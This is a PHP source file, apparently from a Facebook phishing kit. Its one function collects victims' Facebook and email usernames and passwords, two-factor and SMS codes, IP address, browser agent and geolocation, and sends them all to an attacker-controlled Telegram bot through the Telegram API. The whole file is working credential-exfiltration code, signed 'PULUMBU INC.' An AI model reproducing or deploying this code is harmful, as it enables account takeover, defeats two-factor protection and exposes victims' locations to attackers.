<?php
function sendToTelegram($id, $userData, $tele) {

    $telegramMessage = "==========> New Facebook Details <==========\n\n";
    $telegramMessage .= "ID: $id\n";
    $telegramMessage .= "IP Address: {$userData['ip']}\n\n";
    $telegramMessage .= "|=====> First Attempt <=====}\n";
    $telegramMessage .= "User: {$userData['user']}\n";
    $telegramMessage .= "Pass: {$userData['pass']}\n\n";
    $telegramMessage .= "|=====> Second Attempt <=====}\n";
    $telegramMessage .= "User: " . (isset($userData['failed_user']) ? $userData['failed_user'] : 'N/A') . "\n";
    $telegramMessage .= "Pass: " . (isset($userData['failed_pass']) ? $userData['failed_pass'] : 'N/A') . "\n\n";
    $telegramMessage .= "|=====> Email Access <=====}\n";
    $telegramMessage .= "User: " . (isset($userData['email_user']) ? $userData['email_user'] : 'N/A') . "\n";
    $telegramMessage .= "Pass: " . (isset($userData['email_pass']) ? $userData['email_pass'] : 'N/A') . "\n\n";
    $telegramMessage .= "|=====> Codes <=====}\n";
    $telegramMessage .= "Authentication: " . (isset($userData['auth_code']) ? $userData['auth_code'] : 'N/A') . "\n";
    $telegramMessage .= "Notification: " . (isset($userData['alert_code']) ? $userData['alert_code'] : 'N/A') . "\n";
    $telegramMessage .= "SMS: " . (isset($userData['sms_code']) ? $userData['sms_code'] : 'N/A') . "\n\n";
    $telegramMessage .= "|=====> Browser Agent <=====|\n";
    $telegramMessage .= "Browser: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n";
    $telegramMessage .= "|=======> IP Details <=======|\n";
    $telegramMessage .= "Status: " . (isset($userData['ip_details']['status']) ? $userData['ip_details']['status'] : 'N/A') . "\n";
    $telegramMessage .= "Country: " . (isset($userData['ip_details']['country']) ? $userData['ip_details']['country'] : 'N/A') . "\n";
    $telegramMessage .= "Country Code: " . (isset($userData['ip_details']['countryCode']) ? $userData['ip_details']['countryCode'] : 'N/A') . "\n";
    $telegramMessage .= "Region: " . (isset($userData['ip_details']['region']) ? $userData['ip_details']['region'] : 'N/A') . "\n";
    $telegramMessage .= "Region Name: " . (isset($userData['ip_details']['regionName']) ? $userData['ip_details']['regionName'] : 'N/A') . "\n";
    $telegramMessage .= "City: " . (isset($userData['ip_details']['city']) ? $userData['ip_details']['city'] : 'N/A') . "\n";
    $telegramMessage .= "ZIP: " . (isset($userData['ip_details']['zip']) ? $userData['ip_details']['zip'] : 'N/A') . "\n";
    $telegramMessage .= "Latitude: " . (isset($userData['ip_details']['lat']) ? $userData['ip_details']['lat'] : 'N/A') . "\n";
    $telegramMessage .= "Longitude: " . (isset($userData['ip_details']['lon']) ? $userData['ip_details']['lon'] : 'N/A') . "\n";
    $telegramMessage .= "Timezone: " . (isset($userData['ip_details']['timezone']) ? $userData['ip_details']['timezone'] : 'N/A') . "\n";
    $telegramMessage .= "ISP: " . (isset($userData['ip_details']['isp']) ? $userData['ip_details']['isp'] : 'N/A') . "\n";
    $telegramMessage .= "Organization: " . (isset($userData['ip_details']['org']) ? $userData['ip_details']['org'] : 'N/A') . "\n";
    $telegramMessage .= "AS: " . (isset($userData['ip_details']['as']) ? $userData['ip_details']['as'] : 'N/A') . "\n";
    $telegramMessage .= "Query: " . (isset($userData['ip_details']['query']) ? $userData['ip_details']['query'] : 'N/A') . "\n";
    $telegramMessage .= "==============================\n\n";
    $telegramMessage .= "|=======> PULUMBU INC. <=======|\n";

    $telegramUrl = "https://api.telegram.org/bot{$tele['telegram_bot_token']}/sendMessage";
    $telegramData = [
        'chat_id' => $tele['telegram_chat_id'],
        'text' => $telegramMessage
    ];
    $response = @file_get_contents($telegramUrl . "?" . http_build_query($telegramData));
    if ($response === FALSE) {
        error_log("Failed to send message to Telegram.");
    }
}
?>